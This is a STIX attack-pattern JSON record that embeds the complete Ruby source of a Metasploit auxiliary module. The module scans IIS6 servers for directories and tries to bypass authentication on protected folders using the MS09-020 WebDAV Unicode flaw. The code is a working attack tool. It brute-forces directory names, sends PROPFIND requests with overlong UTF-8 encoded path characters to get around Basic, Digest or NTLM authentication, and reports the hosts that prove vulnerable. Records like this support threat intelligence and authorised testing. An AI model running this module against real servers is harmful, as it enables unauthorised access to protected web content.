{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e7225118-1b48-4672-82b5-9689bf633d31",
    "created": "2024-08-14T16:29:22.778333Z",
    "modified": "2024-08-14T16:29:22.778337Z",
    "name": "MS09-020 IIS6 WebDAV Unicode Auth Bypass Directory Scanner",
    "description": " This module is based on et's HTTP Directory Scanner module with one exception. Where authentication is required, it attempts to bypass authentication using the WebDAV IIS6 Unicode vulnerability discovered by Kingcope. The vulnerability appears to be exploitable where WebDAV is enabled on the IIS6 server, and any protected folder requires either Basic, Digest or NTLM authentication. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/dir_webdav_unicode_bypass.rb",
            "external_id": "dir_webdav_unicode_bypass.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-1535"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-1122"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::WmapScanDir\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'   \t\t=> 'MS09-020 IIS6 WebDAV Unicode Auth Bypass Directory Scanner',\n      'Description'\t=> %q{\n        This module is based on et's HTTP Directory Scanner module,\n        with one exception. Where authentication is required, it attempts\n        to bypass authentication using the WebDAV IIS6 Unicode vulnerability\n        discovered by Kingcope. The vulnerability appears to be exploitable\n        where WebDAV is enabled on the IIS6 server, and any protected folder\n        requires either Basic, Digest or NTLM authentication.\n      },\n      'Author' \t\t=> [ 'aushack' ],\n      'License'\t\t=> MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'MSB', 'MS09-020' ],\n          [ 'CVE', '2009-1535' ],\n          [ 'CVE', '2009-1122' ],\n          [ 'OSVDB', '54555' ],\n          [ 'BID', '34993' ],\n        ]))\n\n    register_options(\n      [\n        OptString.new('PATH', [ true,  \"The path to identify files\", '/']),\n        OptInt.new('ERROR_CODE', [ true, \"Error code for non existent directory\", 404]),\n        OptPath.new('DICTIONARY',   [ false, \"Path of word dictionary to use\",\n            File.join(Msf::Config.data_directory, \"wmap\", \"wmap_dirs.txt\")\n          ]\n        ),\n        OptPath.new('HTTP404S',   [ false, \"Path of 404 signatures to use\",\n            File.join(Msf::Config.data_directory, \"wmap\", \"wmap_404s.txt\")\n          ]\n        )\n      ])\n\n    register_advanced_options(\n      [\n        OptBool.new('NoDetailMessages', [ false, \"Do not display detailed test messages\", true ])\n      ])\n\n  end\n\n  def run_host(ip)\n    conn = true\n    ecode = nil\n    emesg = nil\n\n    tpath = normalize_uri(datastore['PATH'])\n    if tpath[-1,1] != '/'\n      tpath += '/'\n    end\n\n    ecode = datastore['ERROR_CODE'].to_i\n    vhost = datastore['VHOST'] || wmap_target_host\n    prot  = datastore['SSL'] ? 'https' : 'http'\n\n\n    #\n    # Detect error code\n    #\n    begin\n      randdir = Rex::Text.rand_text_alpha(5).chomp + '/'\n      res = send_request_cgi({\n        'uri'  \t\t=>  tpath+randdir,\n        'method'   \t=> 'GET',\n        'ctype'\t\t=> 'text/html'\n      }, 20)\n\n      return if not res\n\n      tcode = res.code.to_i\n\n\n      # Look for a string we can signature on as well\n      if(tcode >= 200 and tcode <= 299)\n\n        File.open(datastore['HTTP404S'], 'rb').each do |str|\n          if(res.body.index(str))\n            emesg = str\n            break\n          end\n        end\n\n        if(not emesg)\n          print_status(\"Using first 256 bytes of the response as 404 string\")\n          emesg = res.body[0,256]\n        else\n          print_status(\"Using custom 404 string of '#{emesg}'\")\n        end\n      else\n        ecode = tcode\n        print_status(\"Using code '#{ecode}' as not found.\")\n      end\n\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      conn = false\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    end\n\n    return if not conn\n\n    webdav_req = '<?xml version=\"1.0\" encoding=\"utf-8\"?><propfind xmlns=\"DAV:\"><prop><getcontentlength xmlns=\"DAV:\"/>' +\n      '<getlastmodified xmlns=\"DAV:\"/><executable xmlns=\"http://apache.org/dav/props/\"/><resourcetype xmlns=\"DAV:\"/>' +\n      '<checked-in xmlns=\"DAV:\"/><checked-out xmlns=\"DAV:\"/></prop></propfind>'\n\n    File.open(datastore['DICTIONARY'], 'rb').each do |testf|\n      begin\n        testfdir = testf.chomp + '/'\n        res = send_request_cgi({\n          'uri'  \t\t=>  tpath + testfdir,\n          'method'   \t=> 'PROPFIND',\n          'ctype'\t\t=> 'application/xml',\n          'headers' \t=>\n            {\n            },\n          'data'\t\t=> webdav_req + \"\\r\\n\\r\\n\",\n        }, 20)\n\n\n        if(not res or ((res.code.to_i == ecode) or (emesg and res.body.index(emesg))))\n          if !datastore['NoDetailMessages']\n            print_status(\"NOT Found #{wmap_base_url}#{tpath}#{testfdir} #{res.code} (#{wmap_target_host})\")\n          end\n        elsif (res.code.to_i == 401)\n          print_status(\"Found protected folder #{wmap_base_url}#{tpath}#{testfdir} #{res.code} (#{wmap_target_host})\")\n          print_status(\"\\tTesting for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.\")\n\n          cset  = %W{ & ^ % $ # @ ! }\n          buff  = ''\n          blen  = rand(16)+1\n          while(buff.length < blen)\n            buff << cset[ rand(cset.length) ]\n          end\n          bogus = Rex::Text.uri_encode(Rex::Text.to_unicode( buff, 'utf-8', 'overlong', 2))\n\n          res = send_request_cgi({\n            'uri'  \t\t=>  tpath + bogus + testfdir,\n            'method'   \t=> 'PROPFIND',\n            'ctype'\t\t=> 'application/xml',\n            'headers' \t=>\n              {\n                #'Translate'\t => 'f', # Not required in PROPFIND, only GET - aushack 20091518\n              },\n            'data'\t\t=> webdav_req + \"\\r\\n\\r\\n\",\n          }, 20)\n\n          if (res and res.code.to_i == 207)\n            print_good(\"\\tFound vulnerable WebDAV Unicode bypass target #{wmap_base_url}#{tpath}%c0%af#{testfdir} #{res.code} (#{wmap_target_host})\")\n\n            # Unable to use report_web_vuln as method is PROPFIND and is not part of allowed\n            # list in db.rb\n\n            report_note(\n              :host\t=> ip,\n              :proto => 'tcp',\n              :sname => (ssl ? 'https' : 'http'),\n              :port\t=> rport,\n              :type\t=> 'UNICODE_WEBDAV_BYPASS',\n              :data\t=> \"#{tpath}%c0%af#{testfdir} Code: #{res.code}\",\n              :update => :unique_data\n            )\n\n          end\n        end\n\n      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      rescue ::Timeout::Error, ::Errno::EPIPE\n      end\n    end\n\n  end\nend\n"
}